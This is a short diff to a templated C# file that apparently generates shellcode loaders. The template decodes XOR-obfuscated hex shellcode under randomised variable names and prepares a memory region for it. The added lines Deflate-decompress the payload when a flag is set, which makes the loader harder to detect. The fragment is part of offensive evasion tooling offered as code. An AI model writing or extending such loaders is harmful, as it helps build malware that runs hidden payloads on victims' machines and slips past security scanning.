@@ -115,6 +115,15 @@ namespace {{ appdomain_namespace }} {
             byte[] {{ v.var_shellcode }} = {{ v.fn_xor }}(
                 {{ v.fn_hex }}({% for c in shellcode_chunks %}"{{ c }}"{% if not loop.last %}+{% endif %}{% endfor %}),
                 {{ v.var_key }});
+            {%- if is_compressed %}
+            using (var _csm = new System.IO.MemoryStream({{ v.var_shellcode }}))
+            using (var _ds  = new System.IO.Compression.DeflateStream(_csm,
+                                  System.IO.Compression.CompressionMode.Decompress))
+            using (var _dsm = new System.IO.MemoryStream()) {
+                _ds.CopyTo(_dsm);
+                {{ v.var_shellcode }} = _dsm.ToArray();
+            }
+            {%- endif %}
             {%- endif %}
 
             IntPtr {{ v.var_region }} = IntPtr.Zero;
